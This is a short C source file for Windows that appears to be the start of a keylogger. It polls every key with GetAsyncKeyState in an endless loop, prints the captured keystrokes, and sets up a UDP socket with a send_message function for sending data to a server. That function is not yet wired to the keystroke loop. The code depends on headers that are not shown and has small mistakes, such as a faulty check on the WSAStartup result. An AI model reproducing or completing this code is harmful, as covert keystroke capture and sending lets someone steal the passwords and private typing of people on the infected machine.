#include <stdio.h>
#include <winsock2.h>

#include "key.h"
#include "network.h"

void app()
{
    SOCKET client = init_connection();
    while (1)
        for (DWORD i = 0; i < 255; i++)
            if (GetAsyncKeyState(i) == -32767)
                printf("%s", translate_key(i));
}

void init(void)
{
    WSADATA wsa;
    int err = WSAStartup(MAKEWORD(2, 2), &wsa);
    if (err < 0)
    {
        puts("WSAStartup failed !");
        exit(EXIT_FAILURE);
    }
}

void end(void)
{
    WSACleanup();
}

SOCKET init_connection()
{
    SOCKET client = socket(AF_INET, SOCK_DGRAM, 0);
    if (client == INVALID_SOCKET)
    {
        perror("socket()");
        exit(errno);
    }
    printf("socket creates successfully\n");
    return client;
}

const void send_message(SOCKET sock, SOCKADDR_IN serv, char *buffer)
{
    int server_struct_length = sizeof(serv);
    if (sendto(sock, buffer, strlen(buffer), 0, (struct sockaddr *)&serv, server_struct_length) < 0)
    {
        perror("sendto()");
        exit(errno);
    }
}